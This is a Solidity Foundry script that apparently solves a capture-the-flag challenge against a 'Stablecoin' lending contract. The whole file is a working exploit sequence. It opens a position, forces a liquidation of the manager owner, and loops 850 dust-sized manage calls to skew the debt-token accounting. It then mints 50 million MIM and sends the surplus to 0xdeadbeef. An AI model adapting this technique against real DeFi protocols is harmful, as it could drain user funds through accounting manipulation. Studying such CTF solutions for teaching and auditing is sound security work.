
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Stablecoin.sol";

contract StablecoinSolve is Script {

    Stablecoin public stablecoin = Stablecoin(0xb6C4F3B8AF20cfCa6ee776Faf26FD6D9f20A144d);
    Manager public manager = stablecoin.manager();
    Token public mim = stablecoin.mim();
    Token public eth = stablecoin.eth();
    address player = vm.envAddress("PLAYER");


    

    //Manager owner executes the following code:

    // manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);

    // ETH.mint(address(this), 2 ether);
    // ETH.approve(address(manager), type(uint256).max);
    // manager.manage(ETH, 2 ether, true, 3395 ether, true);

    // (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
    // manager.updateSignal(debtToken, 3520 ether);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Stablecoin : ", address(stablecoin));
        console.log("Manager : ", address(manager));
        console.log("Manager Owner: ", address(manager.owner()));

        console.log("MIM : ", address(mim));
        console.log("MIM Manager : ", address(mim.manager()));

        console.log("ETH : ", address(eth));
        console.log("ETH Manager : ", address(eth.manager()));
        
        (ERC20Signal protocolCollateralToken,
        ERC20Signal protocolDebtToken,
        PriceFeed priceFeed,
        uint256 operationTime,
        uint256 baseRate ) =  manager.collateralData(IERC20(eth));
        console.log("protocolCollateralToken : ", address(protocolCollateralToken));
        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
        console.log("protocolCollateralToken totalSupply(): ", protocolCollateralToken.totalSupply());

        console.log("protocolDebtToken : ", address(protocolDebtToken));
        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
        console.log("protocolDebtToken totalSupply(): ", protocolDebtToken.totalSupply());

        console.log("-------------------------------");
        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
        console.log("-------------------------------");


        console.log("isSolved() : ", stablecoin.isSolved());

        mim.approve(address(manager), type(uint256).max );
        eth.approve(address(manager), type(uint256).max );
        manager.manage(eth, 2.1 ether, true, 3521 ether, true);
        eth.transfer(address(manager), 5990 ether);
        manager.liquidate(manager.owner());
        for (uint i = 0; i < 850; i++){
            manager.manage(eth, 1 , true, 0, false);
        }
        manager.manage(eth, 0 , false, 50_000_000 ether , true);
        mim.transfer(address(0xdeadbeef), mim.balanceOf(player) - 50_000_000 ether);

        
        console.log("-------------------------------");
        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
        console.log("-------------------------------");

        console.log("isSolved() : ", stablecoin.isSolved());
        // revert();
    }

}